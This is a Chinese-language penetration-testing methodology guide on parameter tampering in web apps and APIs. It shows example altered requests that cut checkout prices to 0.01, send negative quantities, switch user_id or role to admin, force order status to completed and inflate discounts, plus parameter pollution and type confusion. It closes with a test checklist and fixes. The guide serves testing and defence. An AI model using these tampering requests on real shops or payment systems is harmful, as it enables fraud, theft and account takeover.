# 参数篡改攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的参数篡改攻击检测和利用流程。

## 1.2 适用范围

本文档适用于所有接收客户端参数的 Web 应用和 API 接口。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

参数篡改是指攻击者修改请求中的参数值，以绕过业务逻辑限制、获取未授权访问或执行未授权操作。

**本质问题**：
- 过度信任客户端输入
- 服务端缺少参数验证
- 敏感参数客户端可控

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-20 | 不当输入验证 |
| CWE-840 | 业务逻辑缺陷 |

## 2.2 攻击常见于哪些业务场景

| 场景 | 可篡改参数 | 潜在危害 |
|-----|-----------|---------|
| 电商结算 | price, total, discount | 低价购买商品 |
| 用户资料 | user_id, role, email | 账户接管 |
| 订单系统 | order_id, quantity, status | 订单篡改 |
| 支付系统 | amount, currency, recipient | 资金盗窃 |
| 投票系统 | vote_count, user_id | 刷票 |

## 2.3 漏洞发现方法

### 2.3.1 参数识别

```bash
# 抓取所有请求，识别参数
# URL 参数
?id=123&user=456

# POST 数据
{"price": 99.99, "quantity": 1}

# Cookie
user_id=123; role=user

# HTTP 头
X-User-ID: 123
```

### 2.3.2 参数类型测试

```bash
# 数字参数
price=99.99 → price=0.01
price=99.99 → price=-100
price=99.99 → price=999999999

# 字符串参数
role=user → role=admin
status=pending → status=completed

# 布尔参数
is_admin=false → is_admin=true
verified=no → verified=yes
```

### 2.3.3 隐藏参数探测

```bash
# 添加额外参数
POST /api/checkout
{
    "items": [...],
    "total": 99.99,
    "discount": 0,      # 添加 discount 参数
    "shipping": 0       # 添加 shipping 参数
}

# 测试系统是否处理未知参数
```

## 2.4 漏洞利用方法

### 2.4.1 价格篡改

```bash
# 电商结算请求
POST /api/checkout
{
    "items": [
        {"id": 1, "name": "iPhone", "price": 999.99}
    ],
    "total": 999.99
}

# 篡改后
POST /api/checkout
{
    "items": [
        {"id": 1, "name": "iPhone", "price": 0.01}
    ],
    "total": 0.01
}
```

### 2.4.2 数量篡改

```bash
# 原始请求
POST /api/cart/add
{
    "product_id": 123,
    "quantity": 1
}

# 篡改后
POST /api/cart/add
{
    "product_id": 123,
    "quantity": -1    # 负数
}

# 或超大数量
POST /api/cart/add
{
    "product_id": 123,
    "quantity": 999999
}
```

### 2.4.3 身份参数篡改

```bash
# 用户资料请求
GET /api/profile?user_id=123

# 篡改为他人 ID
GET /api/profile?user_id=1

# 或篡改为管理员 ID
GET /api/profile?user_id=1&role=admin
```

### 2.4.4 状态参数篡改

```bash
# 订单状态更新
POST /api/order/update
{
    "order_id": "12345",
    "status": "pending"
}

# 篡改为已完成
POST /api/order/update
{
    "order_id": "12345",
    "status": "completed"
}
```

### 2.4.5 折扣/优惠券篡改

```bash
# 结算请求
POST /api/checkout
{
    "items": [...],
    "discount": 0,
    "coupon": ""
}

# 篡改后
POST /api/checkout
{
    "items": [...],
    "discount": 999,      # 超大折扣
    "coupon": "ADMIN50"   # 未授权优惠券
}
```

## 2.5 漏洞利用绕过方法

### 2.5.1 服务端验证绕过

```bash
# 如果服务端验证某些参数
# 尝试：
# - 不同参数名 (price vs unit_price)
# - 不同数据类型 (字符串 vs 数字)
# - 不同编码 (URL 编码 vs 原始)
```

### 2.5.2 参数污染

```bash
# 发送多个同名参数
price=99.99&price=0.01

# 服务端可能使用第一个或最后一个值
```

### 2.5.3 类型混淆

```bash
# 发送不同类型的数据
{"price": "0.01"}    # 字符串
{"price": 0.01}      # 数字
{"price": null}      # 空值
{"price": ""}        # 空字符串
{"price": []}        # 数组
{"price": {}}        # 对象
```

---

# 第三部分：附录

## 3.1 参数篡改测试检查清单

```
□ 识别所有输入参数
□ 测试数字参数边界
□ 测试字符串参数篡改
□ 测试布尔参数翻转
□ 测试隐藏参数添加
□ 测试参数污染
□ 测试类型混淆
□ 检查服务端验证
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| Burp Suite | 请求拦截和修改 | https://portswigger.net/burp |
| OWASP ZAP | 自动化扫描 | https://www.zaproxy.org/ |
| Postman | API 测试 | https://www.postman.com/ |

## 3.3 修复建议

1. **服务端验证** - 所有参数在服务端验证
2. **敏感参数保护** - 敏感参数不暴露给客户端
3. **输入验证** - 严格验证所有输入
4. **业务逻辑验证** - 在服务端重新计算关键值

---

**参考资源**：
- [OWASP Testing Guide - Business Logic](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger - Parameter Tampering](https://portswigger.net/web-security/logic-flaws/examples)
